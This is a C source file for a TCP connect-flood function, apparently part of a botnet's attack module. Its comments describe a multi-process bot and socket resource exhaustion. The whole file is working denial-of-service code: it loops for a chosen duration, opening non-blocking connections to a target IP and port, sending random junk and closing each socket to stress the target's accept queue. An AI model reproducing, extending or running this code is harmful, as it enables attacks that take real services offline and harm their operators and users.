#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>

#include "attack.h"

// TCP Connect Flood (Socket Resource Exhaustion)
// Layer 4/7 hybrid. Opens real connections.
void attack_socket(uint32_t ip, uint16_t port, uint32_t duration) {
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = ip;

    time_t end_time = time(NULL) + duration;
    
    // We want to open many sockets, but we are limited by ulimit if single process.
    // In multi-process bot, this works better.
    // Logic: Connect -> Send Garbage -> Close (or keep open if Slowloris).
    // This looks like a Connection Flood.
    
    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        // Non-blocking connect to fast fail
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        connect(sock, (struct sockaddr *)&dest, sizeof(dest));
        
        // Wait briefly or check status?
        // For flooding, we just spam connect() calls. 
        // If we reach FD limit, we close old ones.
        
        // Actually, just sending a bit of data helps legitimate it.
        // If EINPROGRESS, we assume it's handshaking.
        
        // Garbage Payload
        char junk[32];
        *(uint32_t*)junk = fast_rand();
        send(sock, junk, sizeof(junk), MSG_NOSIGNAL);
        
        // Close immediately? Or wait? 
        // Aggressive closing (TIME_WAIT stress) or Keep Open (Ram stress).
        // Let's do rapid close to stress accept queue.
        close(sock);
    }
}
